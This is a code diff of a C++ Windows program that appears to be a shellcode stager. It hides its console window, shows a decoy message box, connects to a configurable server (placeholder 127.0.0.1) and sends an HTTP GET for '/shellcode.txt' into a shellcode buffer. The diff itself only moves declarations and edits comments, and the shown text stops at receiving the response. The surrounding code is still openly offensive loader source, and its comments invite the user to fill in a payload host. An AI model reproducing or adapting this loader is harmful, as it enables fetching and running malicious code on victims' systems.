@@ -3,7 +3,7 @@
 #include <windows.h>
 #include <iostream> 
 
-#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib,"ws2_32.lib")
 #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 
 using namespace std;
@@ -24,12 +24,16 @@ int main()
 	HINSTANCE hInst;
 	WSADATA wsaData;
 	SOCKADDR_IN SockAddr;
-
-	// address hosting shellcode
+	
+	// enter address hosting shellcode here..
 	string server = "127.0.0.1";
-
+	
 	// enter path to shellcode.txt file here..
 	string path = "/shellcode.txt";
+
+	char buf[8192];
+	string response;
+	unsigned char shellcode[8192];
 
 	// call message box function
 	messagebox();
@@ -44,12 +48,8 @@ int main()
 	connect(sock, (SOCKADDR*)(&SockAddr), sizeof(SockAddr));
 
 
-	string get_http = "GET " + path + " HTTP/1.1\r\nHost: " + server + "\r\nConnection: close\r\n\r\n";
-	char buf[8192];
-	string response;
-	unsigned char shellcode[8192];
-
 	// send HTTP GET request to server
+	string get_http = "GET " + path + " HTTP/1.1\r\nHost: " + server + "\r\nConnection: close\r\n\r\n";
 	send(sock, get_http.c_str(), strlen(get_http.c_str()), 0);
 
 	// receive and store http response
